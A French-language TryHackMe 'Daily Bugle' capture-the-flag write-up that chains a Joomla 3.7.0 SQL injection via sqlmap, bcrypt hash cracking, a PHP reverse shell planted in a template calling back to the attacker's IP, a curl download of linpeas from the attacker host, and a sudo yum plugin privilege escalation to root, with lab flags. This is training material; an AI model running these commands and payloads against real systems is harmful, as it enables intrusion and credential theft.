---
tags: [avancé, cyber, tryhackme]
title: TryHackMe - Daily Bugle
created: '2020-08-18T09:51:49.695Z'
modified: '2020-08-18T19:48:27.696Z'
---

# TryHackMe - Daily Bugle

Ouvrons un nouvel espace de travail dans `metasploit` :

```sh
kali@kali:~$ sudo msfconsole -q
msf5 > workspace -a dailybugle
[*] Added workspace: dailybugle
[*] Workspace: dailybugle
```

Puis lançons le scan `nmap` :

```sh
msf5 > db_nmap -sV -sS dailybugle.thm -script vuln
[*] Nmap: Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-18 06:14 EDT
[*] Nmap: Nmap scan report for dailybugle.thm (10.10.151.221)
[*] Nmap: Host is up (0.030s latency).
[*] Nmap: Not shown: 997 closed ports
[*] Nmap: PORT     STATE SERVICE VERSION
[*] Nmap: 22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
[*] Nmap: |_clamav-exec: ERROR: Script execution failed (use -d to debug)
[*] Nmap: | vulners:
[*] Nmap: |   cpe:/a:openbsd:openssh:7.4:
[*] Nmap: |             CVE-2020-15778  6.8     https://vulners.com/cve/CVE-2020-15778
[*] Nmap: |             CVE-2018-15919  5.0     https://vulners.com/cve/CVE-2018-15919
[*] Nmap: |             CVE-2017-15906  5.0     https://vulners.com/cve/CVE-2017-15906
[*] Nmap: |_            CVE-2020-14145  4.3     https://vulners.com/cve/CVE-2020-14145
[*] Nmap: 80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)
[*] Nmap: |_clamav-exec: ERROR: Script execution failed (use -d to debug)
[*] Nmap: | http-csrf:
[*] Nmap: | Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=dailybugle.thm
[*] Nmap: |   Found the following possible CSRF vulnerabilities:
[*] Nmap: |
[*] Nmap: |     Path: http://dailybugle.thm:80/
[*] Nmap: |     Form id: login-form
[*] Nmap: |     Form action: /index.php
[*] Nmap: |
[*] Nmap: |     Path: http://dailybugle.thm:80/index.php/2-uncategorised/1-spider-man-robs-bank
[*] Nmap: |     Form id: login-form
[*] Nmap: |     Form action: /index.php
[*] Nmap: |
[*] Nmap: |     Path: http://dailybugle.thm:80/index.php/component/users/?view=remind&amp;Itemid=101
[*] Nmap: |     Form id: user-registration
[*] Nmap: |     Form action: /index.php/component/users/?task=remind.remind&Itemid=101
[*] Nmap: |
[*] Nmap: |     Path: http://dailybugle.thm:80/index.php/component/users/?view=remind&amp;Itemid=101
[*] Nmap: |     Form id: login-form
[*] Nmap: |     Form action: /index.php/component/users/?Itemid=101
[*] Nmap: |
[*] Nmap: |     Path: http://dailybugle.thm:80/index.php
[*] Nmap: |     Form id: login-form
[*] Nmap: |     Form action: /index.php
[*] Nmap: |
[*] Nmap: |     Path: http://dailybugle.thm:80/index.php/2-uncategorised
[*] Nmap: |     Form id: login-form
[*] Nmap: |     Form action: /index.php
[*] Nmap: |
[*] Nmap: |     Path: http://dailybugle.thm:80/index.php/component/users/?view=reset&amp;Itemid=101
[*] Nmap: |     Form id: user-registration
[*] Nmap: |     Form action: /index.php/component/users/?task=reset.request&Itemid=101
[*] Nmap: |
[*] Nmap: |     Path: http://dailybugle.thm:80/index.php/component/users/?view=reset&amp;Itemid=101
[*] Nmap: |     Form id: login-form
[*] Nmap: |_    Form action: /index.php/component/users/?Itemid=101
[*] Nmap: | http-dombased-xss:
[*] Nmap: | Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=dailybugle.thm
[*] Nmap: |   Found the following indications of potential DOM based XSS:
[*] Nmap: |
[*] Nmap: |     Source: window.open(this.href,'win2','status=no,toolbar=no,scrollbars=yes,titlebar=no,menubar=no,resizable=yes,width=640,height=480,directories=no,location=no')
[*] Nmap: |_    Pages: http://dailybugle.thm:80/, http://dailybugle.thm:80/index.php/2-uncategorised/1-spider-man-robs-bank, http://dailybugle.thm:80/index.php, http://dailybugle.thm:80/index.php/2-uncategorised
[*] Nmap: | http-enum:
[*] Nmap: |   /administrator/: Possible admin folder
[*] Nmap: |   /administrator/index.php: Possible admin folder
[*] Nmap: |   /robots.txt: Robots file
[*] Nmap: |   /administrator/manifests/files/joomla.xml: Joomla version 3.7.0
[*] Nmap: |   /language/en-GB/en-GB.xml: Joomla version 3.7.0
[*] Nmap: |   /htaccess.txt: Joomla!
[*] Nmap: |   /README.txt: Interesting, a readme.
[*] Nmap: |   /bin/: Potentially interesting folder
[*] Nmap: |   /cache/: Potentially interesting folder
[*] Nmap: |   /icons/: Potentially interesting folder w/ directory listing
[*] Nmap: |   /images/: Potentially interesting folder
[*] Nmap: |   /includes/: Potentially interesting folder
[*] Nmap: |   /libraries/: Potentially interesting folder
[*] Nmap: |   /modules/: Potentially interesting folder
[*] Nmap: |   /templates/: Potentially interesting folder
[*] Nmap: |_  /tmp/: Potentially interesting folder
[*] Nmap: |_http-server-header: Apache/2.4.6 (CentOS) PHP/5.6.40
[*] Nmap: |_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
[*] Nmap: |_http-trace: TRACE is enabled
[*] Nmap: | http-vuln-cve2017-8917:
[*] Nmap: |   VULNERABLE:
[*] Nmap: |   Joomla! 3.7.0 'com_fields' SQL Injection Vulnerability
[*] Nmap: |     State: VULNERABLE
[*] Nmap: |     IDs:  CVE:CVE-2017-8917
[*] Nmap: |     Risk factor: High  CVSSv3: 9.8 (CRITICAL) (CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)
[*] Nmap: |       An SQL injection vulnerability in Joomla! 3.7.x before 3.7.1 allows attackers
[*] Nmap: |       to execute aribitrary SQL commands via unspecified vectors.
[*] Nmap: |
[*] Nmap: |     Disclosure date: 2017-05-17
[*] Nmap: |     Extra information:
[*] Nmap: |       User: root@localhost
[*] Nmap: |     References:
[*] Nmap: |       https://blog.sucuri.net/2017/05/sql-injection-vulnerability-joomla-3-7.html
[*] Nmap: |_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-8917
[*] Nmap: | vulners:
[*] Nmap: |   cpe:/a:apache:http_server:2.4.6:
[*] Nmap: |             CVE-2017-7679   7.5     https://vulners.com/cve/CVE-2017-7679
[*] Nmap: |             CVE-2018-1312   6.8     https://vulners.com/cve/CVE-2018-1312
[*] Nmap: |             CVE-2017-15715  6.8     https://vulners.com/cve/CVE-2017-15715
[*] Nmap: |             CVE-2014-0226   6.8     https://vulners.com/cve/CVE-2014-0226
[*] Nmap: |             CVE-2017-9788   6.4     https://vulners.com/cve/CVE-2017-9788
[*] Nmap: |             CVE-2019-0217   6.0     https://vulners.com/cve/CVE-2019-0217
[*] Nmap: |             CVE-2020-1927   5.8     https://vulners.com/cve/CVE-2020-1927
[*] Nmap: |             CVE-2019-10098  5.8     https://vulners.com/cve/CVE-2019-10098
[*] Nmap: |             CVE-2020-1934   5.0     https://vulners.com/cve/CVE-2020-1934
[*] Nmap: |             CVE-2019-0220   5.0     https://vulners.com/cve/CVE-2019-0220
[*] Nmap: |             CVE-2018-17199  5.0     https://vulners.com/cve/CVE-2018-17199
[*] Nmap: |             CVE-2017-9798   5.0     https://vulners.com/cve/CVE-2017-9798
[*] Nmap: |             CVE-2017-15710  5.0     https://vulners.com/cve/CVE-2017-15710
[*] Nmap: |             CVE-2016-8743   5.0     https://vulners.com/cve/CVE-2016-8743
[*] Nmap: |             CVE-2016-2161   5.0     https://vulners.com/cve/CVE-2016-2161
[*] Nmap: |             CVE-2016-0736   5.0     https://vulners.com/cve/CVE-2016-0736
[*] Nmap: |             CVE-2014-3523   5.0     https://vulners.com/cve/CVE-2014-3523
[*] Nmap: |             CVE-2014-0231   5.0     https://vulners.com/cve/CVE-2014-0231
[*] Nmap: |             CVE-2014-0098   5.0     https://vulners.com/cve/CVE-2014-0098
[*] Nmap: |             CVE-2013-6438   5.0     https://vulners.com/cve/CVE-2013-6438
[*] Nmap: |             CVE-2020-11985  4.3     https://vulners.com/cve/CVE-2020-11985
[*] Nmap: |             CVE-2019-10092  4.3     https://vulners.com/cve/CVE-2019-10092
[*] Nmap: |             CVE-2016-4975   4.3     https://vulners.com/cve/CVE-2016-4975
[*] Nmap: |             CVE-2015-3185   4.3     https://vulners.com/cve/CVE-2015-3185
[*] Nmap: |             CVE-2014-8109   4.3     https://vulners.com/cve/CVE-2014-8109
[*] Nmap: |             CVE-2014-0118   4.3     https://vulners.com/cve/CVE-2014-0118
[*] Nmap: |             CVE-2014-0117   4.3     https://vulners.com/cve/CVE-2014-0117
[*] Nmap: |             CVE-2013-4352   4.3     https://vulners.com/cve/CVE-2013-4352
[*] Nmap: |             CVE-2018-1283   3.5     https://vulners.com/cve/CVE-2018-1283
[*] Nmap: |_            CVE-2016-8612   3.3     https://vulners.com/cve/CVE-2016-8612
[*] Nmap: 3306/tcp open  mysql   MariaDB (unauthorized)
[*] Nmap: |_clamav-exec: ERROR: Script execution failed (use -d to debug)
[*] Nmap: |_mysql-vuln-cve2012-2122: ERROR: Script execution failed (use -d to debug)
[*] Nmap: Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 56.37 seconds
```

On a découvert un serveur http, vulnérable Joomla 3.7.0 !

```sh
kali@kali:~/Documents$ sqlmap -u "http://dailybugle.thm/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering] --tamper=space2comment

sqlmap identified the following injection point(s) with a total of 4293 HTTP(s) requests:
---
Parameter: list[fullordering] (GET)
    Type: error-based
    Title: MySQL >= 5.0 error-based - Parameter replace (FLOOR)
    Payload: option=com_fields&view=fields&layout=modal&list[fullordering]=(SELECT 6704 FROM(SELECT COUNT(*),CONCAT(0x7162707671,(SELECT (ELT(6704=6704,1))),0x7162787171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
---
[07:30:13] [WARNING] changes made by tampering scripts are not included in shown payload content(s)
[07:30:13] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[07:30:13] [INFO] fetching database names
[07:30:13] [INFO] retrieved: 'information_schema'
[07:30:14] [INFO] retrieved: 'joomla'
[07:30:14] [INFO] retrieved: 'mysql'
[07:30:14] [INFO] retrieved: 'performance_schema'
[07:30:14] [INFO] retrieved: 'test'
available databases [5]:
[*] information_schema
[*] joomla
[*] mysql
[*] performance_schema
[*] test

[07:30:14] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 4264 times
[07:30:14] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/dailybugle.thm'

[*] ending @ 07:30:14 /2020-08-18/
```

Nous voulons alors afficher les bases de données en remplaçant `--dbs` par `-D <database> --tables` :

```sh
kali@kali:~/Documents$ sqlmap -u "http://dailybugle.thm/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -D joomla --tables -p list[fullordering]

Database: joomla
[72 tables]
+----------------------------+
| #__assets                  |
| #__associations            |
| #__banner_clients          |
| #__banner_tracks           |
| #__banners                 |
| #__categories              |
| #__contact_details         |
| #__content_frontpage       |
| #__content_rating          |
| #__content_types           |
| #__content                 |
| #__contentitem_tag_map     |
| #__core_log_searches       |
| #__extensions              |
| #__fields_categories       |
| #__fields_groups           |
| #__fields_values           |
| #__fields                  |
| #__finder_filters          |
| #__finder_links_terms0     |
| #__finder_links_terms1     |
| #__finder_links_terms2     |
| #__finder_links_terms3     |
| #__finder_links_terms4     |
| #__finder_links_terms5     |
| #__finder_links_terms6     |
| #__finder_links_terms7     |
| #__finder_links_terms8     |
| #__finder_links_terms9     |
| #__finder_links_termsa     |
| #__finder_links_termsb     |
| #__finder_links_termsc     |
| #__finder_links_termsd     |
| #__finder_links_termse     |
| #__finder_links_termsf     |
| #__finder_links            |
| #__finder_taxonomy_map     |
| #__finder_taxonomy         |
| #__finder_terms_common     |
| #__finder_terms            |
| #__finder_tokens_aggregate |
| #__finder_tokens           |
| #__finder_types            |
| #__languages               |
| #__menu_types              |
| #__menu                    |
| #__messages_cfg            |
| #__messages                |
| #__modules_menu            |
| #__modules                 |
| #__newsfeeds               |
| #__overrider               |
| #__postinstall_messages    |
| #__redirect_links          |
| #__schemas                 |
| #__session                 |
| #__tags                    |
| #__template_styles         |
| #__ucm_base                |
| #__ucm_content             |
| #__ucm_history             |
| #__update_sites_extensions |
| #__update_sites            |
| #__updates                 |
| #__user_keys               |
| #__user_notes              |
| #__user_profiles           |
| #__user_usergroup_map      |
| #__usergroups              |
| #__users                   |
| #__utf8_conversion         |
| #__viewlevels              |
+----------------------------+
```

Et pour énumérer une table, en remplaçant `--tables` par `-T <table> --columns` :

```sh
kali@kali:~/Documents$ sqlmap -u "http://dailybugle.thm/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -D joomla -T "#__users" --columns -p list[fullordering]

do you want to use common column existence check? [y/N/q] y
Database: joomla
Table: #__users
[6 columns]
+----------+-------------+
| Column   | Type        |
+----------+-------------+
| email    | non-numeric |
| id       | numeric     |
| name     | non-numeric |
| params   | numeric     |
| password | non-numeric |
| username | non-numeric |
+----------+-------------+
```

Enfin, pour récupérer une colonne, en remplaçant `--columns` par `-C username --dump` :

```sh
kali@kali:~/Documents$ sqlmap -u "http://dailybugle.thm/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -D joomla -T "#__users" -C username,password --dump -p list[fullordering]

+----------+--------------------------------------------------------------+
| username | password                                                     |
+----------+--------------------------------------------------------------+
| jonah    | $2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm |
+----------+--------------------------------------------------------------+
```

Le hash est de type `bcrypt` (grâce à https://www.tunnelsup.com/hash-analyzer/), on va utiliser `john` pour le craquer :

```sh
kali@kali:~/Documents$ sudo john --crack-status hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
spiderman123     (?)
1g 0:00:03:48 DONE (2020-08-18 11:39) 0.004367g/s 204.5p/s 204.5c/s 204.5C/s thelma1..speciala
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

En cherchant sur internet, on trouve qu'il faut aller dans `Extensions > Template`, sélectionner un template, puis `index.php` et remplacer par un reverse shell (dans mon cas, celui de pentest monkey), en retournant l'ip vers soi :

```sh
$ip = '10.11.7.104';  // CHANGE THIS
$port = 4444;       // CHANGE THIS
```
Puis, on sélectionne preview template lorsque notre listener netcat est déployé :

```sh
kali@kali:~/Documents$ nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.11.7.104] from (UNKNOWN) [10.10.151.221] 45982
Linux dailybugle 3.10.0-1062.el7.x86_64 #1 SMP Wed Aug 7 18:08:02 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 11:51:50 up  5:58,  0 users,  load average: 0.01, 0.04, 0.05
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=48(apache) gid=48(apache) groups=48(apache)
sh: no job control in this shell
sh-4.2$ whoami
whoami
apache
sh-4.2$ ls /home
ls /home
jjameson
```

On a un shell, cependant on n'est pas l'utilisateur `jjameson`, mais `apache`. Téléchargeons linpeas que l'on héberge sur un SimpleHTTPServer. Sur notre machine, dans le dossier de linpeas :

```sh
kali@kali:~/privilege-escalation-awesome-scripts-suite/linPEAS$ sudo python -m SimpleHTTPServer 80
Serving HTTP on 0.0.0.0 port 80 ...
```

Et sur la machine victime :

```sh
sh-4.2$ curl http://10.11.7.104/linpeas.sh -o linpeas.sh
curl http://10.11.7.104/linpeas.sh -o linpeas.sh
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  228k  100  228k    0     0  1918k      0 --:--:-- --:--:-- --:--:-- 1933k
sh-4.2$ ls
ls
linpeas.sh
sh-4.2$ chmod +x linpeas.sh
chmod +x linpeas.sh
```

Dans la sortie console, on trouve :

```sh
[+] Searching passwords in config PHP files
        public $password = 'nv5uz9r3ZEDzVjNu';  
```

On va se ssh avec le couple `jjameson:nv5uz9r3ZEDzVjNu` :

```sh
kali@kali:~$ ssh jjameson@10.10.148.190
The authenticity of host '10.10.148.190 (10.10.148.190)' can't be established.
ECDSA key fingerprint is SHA256:apAdD+3yApa9Kmt7Xum5WFyVFUHZm/dCR/uJyuuCi5g.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.148.190' (ECDSA) to the list of known hosts.
jjameson@10.10.148.190's password: 
Last login: Mon Dec 16 05:14:55 2019 from netwars
[jjameson@dailybugle ~]$ whoami
jjameson
[jjameson@dailybugle ~]$ groups
jjameson
[jjameson@dailybugle ~]$ cat user.txt 
27a260fe3cba712cfdedb1c86d80442e
```

Un coup de `sudo -l` pour savoir si l'on a des privilèges :

```sh
[jjameson@dailybugle ~]$ sudo -l

User jjameson may run the following commands on dailybugle:
    (ALL) NOPASSWD: /usr/bin/yum
```

De même, réexécuter `linpeas` nous signale la même alerte, en nous redirigeant vers https://gtfobins.github.io/gtfobins/yum/. On copie l'exploit dans un fichier :

```sh
TF=$(mktemp -d)
cat >$TF/x<<EOF
[main]
plugins=1
pluginpath=$TF
pluginconfpath=$TF
EOF

cat >$TF/y.conf<<EOF
[main]
enabled=1
EOF

cat >$TF/y.py<<EOF
import os
import yum
from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
requires_api_version='2.1'
def init_hook(conduit):
  os.execl('/bin/sh','/bin/sh')
EOF

sudo yum -c $TF/x --enableplugin=y
```

Et on l'exécute :

```sh
[jjameson@dailybugle tmp]$ nano yumroot
[jjameson@dailybugle tmp]$ chmod +x yumroot 
[jjameson@dailybugle tmp]$ ./yumroot 
Loaded plugins: y
No plugin match for: y
sh-4.2# whoami
root
sh-4.2# cat /root/root.txt
eec3d53292b1821868266858d7fa6f79
```

